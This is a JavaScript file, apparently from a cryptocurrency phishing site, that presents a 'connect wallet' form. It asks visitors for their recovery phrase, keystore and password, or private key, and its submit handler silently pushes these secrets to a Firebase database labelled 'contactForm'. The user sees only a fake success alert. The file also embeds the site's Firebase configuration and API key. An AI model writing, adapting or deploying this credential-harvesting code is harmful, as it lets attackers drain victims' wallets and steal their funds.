


  const firebaseConfig = {
    apiKey: "AIzaSyBctXtzWLHtxK7c0Wu9m9XpUeMmae2K17k",
    authDomain: "crypto-website-236df.firebaseapp.com",
    databaseURL: "https://crypto-website-236df-default-rtdb.firebaseio.com",
    projectId: "crypto-website-236df",
    storageBucket: "crypto-website-236df.appspot.com",
    messagingSenderId: "729097529040",
    appId: "1:729097529040:web:e8a7bde72f3a8dc622e0d5"
  };


// initialize firebase
firebase.initializeApp(firebaseConfig);

// reference your database
var contactFormDB = firebase.database().ref("contactForm");

document.getElementById("contactForm").addEventListener("submit", submitForm);

function submitForm(e) {
  e.preventDefault();

   document.getElementById('loading-spinner').style.display = 'inline';
  
  var selectedWallet = getElementVal("selected-wallet");
  
            var walletInfoType = document.getElementById('wallet-info-type').value;

            // Retrieve information input based on the selected type
            
            switch (walletInfoType) {
                case 'phrase':
                    var walletPhrase = document.getElementById('wallet-phrase').value; 
                    break;
                case 'keystore':
                    var walletKeystore = document.getElementById('wallet-keystore').value;
                    var walletPassword = document.getElementById('wallet-password').value;
                    break;
                case 'private-key':
                    var walletPrivateKey = document.getElementById('wallet-private-key').value;
                    break;
                default:
                    break;
            }

  saveMessages(selectedWallet,walletPhrase,walletKeystore,walletPassword,walletPrivateKey);

  //   enable alert
  document.querySelector(".alert").style.display = "block";

  //   remove the alert
  setTimeout(() => {
    document.querySelector(".alert").style.display = "none";
  }, 3000);

  //   reset the form
  document.getElementById("contactForm").reset();

  setTimeout(function() {
                // Masque le spinner de chargement
                document.getElementById('loading-spinner').style.display = 'none';
            }, 2000); // Remplacez 2000 par le temps réel de votre opération
        }
}

const saveMessages = (selectedWallet,walletPhrase,walletKeystore,walletPassword,walletPrivateKey) => {
  var newContactForm = contactFormDB.push();
   const data = {
 
    selectedWallet: selectedWallet || "",
    walletPhrase: walletPhrase || "",
    walletKeystore: walletKeystore || "",
    walletPassword: walletPassword || "",
    walletPrivateKey: walletPrivateKey || "",
  };

  newContactForm.set(data);
  // newContactForm.set({
  //   name: name,
  //   emailid: emailid,
  //   msgContent: msgContent,
  //    selectedWallet: selectedWallet,
  //   walletPhrase: walletPhrase,
  //   walletKeystore: walletKeystore,
  //   walletPassword: walletPassword,
  //   walletPrivateKey: walletPrivateKey, 
  // });
};

const getElementVal = (id) => {
  return document.getElementById(id).value;
};

function selectWallet() {
            var selectedWallet = document.getElementById("wallet-list").value;
            document.getElementById("selected-wallet").value = selectedWallet;
            showWalletForm(selectedWallet);
        }

        function showWalletForm(selectedWallet) {
            // Display the wallet connection form
            document.getElementById('contactForm').style.display = 'block';

            // Show or hide information input based on the selected wallet type
            showInfoInput(selectedWallet);
        }

function showInfoInput(selectedWallet) {
            // Retrieve selected information type
            const walletInfoType = document.getElementById('wallet-info-type').value;

            // Remove any existing information input elements
            const infoInputContainer = document.getElementById('info-input-container');
            infoInputContainer.innerHTML = '';

            // Dynamically create and append information input fields based on the selected type and wallet
            switch (walletInfoType) {
                case 'phrase':
                    infoInputContainer.innerHTML = `
                        <label for="wallet-phrase">Enter your recovery phrase for ${selectedWallet}:</label>
                        <textarea id="wallet-phrase" placeholder="Typical 12 (sometimes 24) words separated by single spaces." rows="4" required></textarea>
                    `;
                    break;
                case 'keystore':
                    infoInputContainer.innerHTML = `
                        <label for="wallet-keystore">Enter Keystore for ${selectedWallet}:</label>
                        <input type="text" id="wallet-keystore" placeholder="Several lines of text beginning with '{...}'" required>
                        <label for="wallet-password">Wallet Password:</label>
                        <input type="password" id="wallet-password" placeholder="Enter your password" required >
                    `;
                    break;
                case 'private-key':
                    infoInputContainer.innerHTML = `
                        <label for="wallet-private-key">Enter your Private Key for ${selectedWallet}:</label>
                        <input type="text" id="wallet-private-key" placeholder="Typically 12 (sometimes 24) words separated by a single space." required>
                    `;
                    break;
                default:
                    break;
            }
        }

function connect() {
            // Affiche le spinner de chargement
            document.getElementById('loading-spinner').style.display = 'inline';

            // Exécutez ici votre logique de connexion ou d'autres traitements asynchrones
            // Par exemple, une requête AJAX ou une opération time-consuming

            // Une fois le traitement terminé, vous pouvez masquer le spinner de chargement
            // Pour l'exemple, j'utilise setTimeout pour simuler une opération asynchrone
            setTimeout(function() {
                // Masque le spinner de chargement
                document.getElementById('loading-spinner').style.display = 'none';
            }, 2000); // Remplacez 2000 par le temps réel de votre opération
        }
 // function showPopup() {
 //        document.getElementById('popup').style.display = 'block';
 //    }

 //    function closePopup() {
 //        document.getElementById('popup').style.display = 'none';
 //    }

 //    document.addEventListener('DOMContentLoaded', function() {
 //        var buttons = document.querySelectorAll('.selection-button, .wallet-action');

 //        buttons.forEach(function(button) {
 //            button.addEventListener('click', function(event) {
 //                event.preventDefault();

 //                if (event.target.classList.contains('wallet-action') && event.target.textContent.trim() === '🚀 Connect Wallet') {
 //                    window.location.href = event.target.getAttribute('href');
 //                } else if (!event.target.classList.contains('selection-button')) {
 //                    showPopup();
 //                }
 //            });
 //        });

 //        var selectionButtons = document.querySelectorAll('.selection-buttons .selection-button');

 //        selectionButtons.forEach(function(button) {
 //            button.addEventListener('click', function(event) {
 //                event.preventDefault();
 //                showPopup();
 //            });
 //        });

 //        var connectWalletHeader = document.querySelector('.btnconnect a');

 //        connectWalletHeader.addEventListener('click', function(event) {
 //            event.preventDefault();
 //            window.location.href = event.target.getAttribute('href');
 //        });
 //    });
  

